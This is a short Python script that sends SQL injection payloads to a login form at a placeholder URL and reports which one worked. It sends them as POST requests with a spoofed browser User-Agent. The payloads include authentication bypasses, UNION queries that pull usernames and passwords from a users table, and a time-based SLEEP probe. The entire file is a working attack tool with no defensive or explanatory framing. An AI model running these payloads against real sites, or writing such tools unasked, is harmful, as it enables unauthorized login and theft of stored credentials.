import requests

TARGET_URL = 'http://example.com/vulnerable-form.php'

payloads = [
    "' OR '1'='1'--",
    "admin' --",
    "') OR ('1'='1'--",
    "'; EXECUTE IMMEDIATE 'SELECT * FROM users'--",
    "' UNION SELECT 1, username, password FROM users--",
    "' UNION SELECT null, username, password FROM users WHERE ''='",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%')--",
    "' OR SLEEP(5) #"
]

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

def attempt_sql_injection(url, payloads):
    for payload in payloads:
        try:
            # Assuming the vulnerable parameter is 'username'
            data = {'username': payload, 'password': 'notused'}
            response = requests.post(url, data=data, headers=headers, timeout=10)
            
            # Implement logic to check for success based on the application's response
            if response.elapsed.total_seconds() > 5:  # Example of a time-based SQLi detection
                print(f"Time-based SQL Injection vulnerability found with payload: {payload}")
                break
            elif "Welcome back" in response.text or "user dashboard" in response.text:
                print(f"SQL Injection vulnerability found with payload: {payload}")
                break
            elif response.status_code != 200:
                print(f"Anomaly detected with payload: {payload} - HTTP Status Code: {response.status_code}")
            else:
                print(f"Payload tested, no obvious vulnerability found: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

# Start the SQL injection test
if __name__ == "__main__":
    attempt_sql_injection(TARGET_URL, payloads)
